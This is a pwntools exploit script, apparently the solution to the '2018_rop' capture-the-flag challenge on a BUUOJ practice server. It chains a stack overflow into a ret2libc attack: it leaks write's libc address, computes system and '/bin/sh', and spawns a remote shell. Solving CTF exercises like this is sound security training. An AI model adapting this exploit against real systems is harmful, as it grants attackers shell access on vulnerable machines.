from pwn import *


print(int(0x88))  # 136
print(int(0x100))  # 256

context.log_level = 'debug'

elf = ELF(r'../2018_rop')
lib_so = ELF(r'../lib/libc6-i386_2.27-3ubuntu1_amd64.so')
r = remote('node5.buuoj.cn', 27831)

write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.sym['main']

# 泄露write
payload = b'A' * (0x88 + 4) + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)

r.sendline(payload)
# write_addr = u32(r.recvuntil(b'\xf7')[-4:].ljust(4, b'\x00'))  # 0xf7e236f0
write_addr = u32(r.recv(4))  # 0xf7e236f0
print(hex(write_addr))

write_offset = lib_so.sym['write']
system_offset = lib_so.sym['system']
bash_offset = lib_so.search(b'/bin/sh').__next__()

bash_addr = write_addr - write_offset
system_addr = bash_addr + system_offset
bash_addr = bash_addr + bash_offset

print(hex(write_offset))
print(hex(system_addr))
print(hex(bash_addr))


payload2 = b'A' * (0x88 + 4) + p32(system_addr) + p32(main_addr) + p32(bash_addr)
r.sendline(payload2)
r.interactive()
